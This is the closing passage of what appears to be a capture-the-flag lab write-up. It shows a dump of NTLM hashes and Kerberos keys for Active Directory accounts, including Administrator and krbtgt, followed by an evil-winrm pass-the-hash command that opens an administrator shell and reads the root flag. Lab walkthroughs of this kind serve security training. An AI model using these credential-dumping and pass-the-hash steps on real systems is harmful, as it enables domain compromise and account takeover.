Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9288173d697316c718bb0f386046b102:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:79581ad15ded4b9f3457dbfc35748ccf:::
Marie.Curie:1105:aad3b435b51404eeaad3b435b51404ee:a4bc00e2a5edcec18bd6266e6c47d455:::
Helen.Frost:1106:aad3b435b51404eeaad3b435b51404ee:7209d1e2b55d242551d2e7aba8604e47:::
Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:f37d004253f5f7525ef9840b43e5dad2:::
Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:980634f9aabfe13aec0111f64bda50c9:::
James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:2716d39cc76e785bd445ca353714854d:::
Ryan.Cooper:1117:aad3b435b51404eeaad3b435b51404ee:062a12325a99a9da55f5070bf9c6fd2a:::
sql_svc:1119:aad3b435b51404eeaad3b435b51404ee:76a96946d9b465ec76a4b0b316785d6b:::
DC$:1002:aad3b435b51404eeaad3b435b51404ee:bfdff77d74764b0d4f940b7e9f684a61:::
FS01$:1103:aad3b435b51404eeaad3b435b51404ee:25451b15eeabfa492d9a18442a6e914b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:db3a850aa5ede4cfacb57490d9b789b1ca0802ae11e09db5f117c1a8d1ccd173
Administrator:aes128-cts-hmac-sha1-96:b4fb863396f4c7a91c49ba0c0637a3ac
Administrator:des-cbc-md5:102f86737c3e9b2f
krbtgt:aes256-cts-hmac-sha1-96:bff2ae7dfc202b4e7141a440c00b91308c45ea918b123d7e97cba1d712e6a435
krbtgt:aes128-cts-hmac-sha1-96:9690508b681c1ec11e6d772c7806bc71
krbtgt:des-cbc-md5:b3ce46a1fe86cb6b
Christine.Flanders:aes256-cts-hmac-sha1-96:ceb5854b48f9b203b4aa9a8e0ac4af28b9dc49274d54e9f9a801902ea73f17ba
Christine.Flanders:aes128-cts-hmac-sha1-96:e0fa68a3060b9543d04a6f84462829d9
Christine.Flanders:des-cbc-md5:8980267623df2637
Marie.Curie:aes256-cts-hmac-sha1-96:616e01b81238b801b99c284e7ebcc3d2d739046fca840634428f83c2eb18dbe8
Marie.Curie:aes128-cts-hmac-sha1-96:daa48c455d1bd700530a308fb4020289
Marie.Curie:des-cbc-md5:256889c8bf678910
Helen.Frost:aes256-cts-hmac-sha1-96:7bd0af768ab18dc1ee596ec9a42eb7fbd0e516e797e15b181e1e1e15658826d7
Helen.Frost:aes128-cts-hmac-sha1-96:41a54a5725638ab34a31595b74c512ba
Helen.Frost:des-cbc-md5:fb735e614a6ba2c4
Michael.Pontiac:aes256-cts-hmac-sha1-96:eca3a512ed24bb1c37cd2886ec933544b0d3cfa900e92b96d056632a6920d050
Michael.Pontiac:aes128-cts-hmac-sha1-96:53456b952411ac9f2f3e2adf433ab443
Michael.Pontiac:des-cbc-md5:833dc82fab76c229
Mallory.Roberts:aes256-cts-hmac-sha1-96:c9ad270adea8746d753e881692e9a75b2487a6402e02c0c915eb8ac6c2c7ab6a
Mallory.Roberts:aes128-cts-hmac-sha1-96:40f22695256d0c49089f7eda2d0d1266
Mallory.Roberts:des-cbc-md5:cb25a726ae198686
James.Dinkleberg:aes256-cts-hmac-sha1-96:c6cade4bc132681117d47dd422dadc66285677aac3e65b3519809447e119458b
James.Dinkleberg:aes128-cts-hmac-sha1-96:35b2ea5440889148eafb6bed06eea4c1
James.Dinkleberg:des-cbc-md5:83ef38dc8cd90da2
Ryan.Cooper:aes256-cts-hmac-sha1-96:d94424fd2a046689ef7ce295cf562dce516c81697d2caf8d03569cd02f753b5f
Ryan.Cooper:aes128-cts-hmac-sha1-96:48ea408634f503e90ffb404031dc6c98
Ryan.Cooper:des-cbc-md5:5b19084a8f640e75
sql_svc:aes256-cts-hmac-sha1-96:1decdb85de78f1ed266480b2f349615aad51e4dc866816f6ac61fa67be5bb598
sql_svc:aes128-cts-hmac-sha1-96:88f45d60fa053d62160e8ea8f1d0231e
sql_svc:des-cbc-md5:970d6115d3f4a43b
DC$:aes256-cts-hmac-sha1-96:0e50c0a6146a62e4473b0a18df2ba4875076037ca1c33503eb0c7218576bb22b
DC$:aes128-cts-hmac-sha1-96:7695e6b660218de8d911840d42e1a498
DC$:des-cbc-md5:3db913751c434f61
FS01$:aes256-cts-hmac-sha1-96:24337077c01b535ab81e63d49114444cd699e12cd9b10970fb01c43fbe0c866e
FS01$:aes128-cts-hmac-sha1-96:04b54ef9fd856c84e1633918935f0f03
FS01$:des-cbc-md5:6707e9dfc8a846a4
[*] Cleaning up... 
```

```bash
$ # Use the Administrator NTLM hash for shell access
evil-winrm -i 10.129.234.50 -u Administrator -H ec17f7a2a4d96e177bfd101b94ffc0a7

*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
45165dd979caacfe7191306c36a8458a
```

---
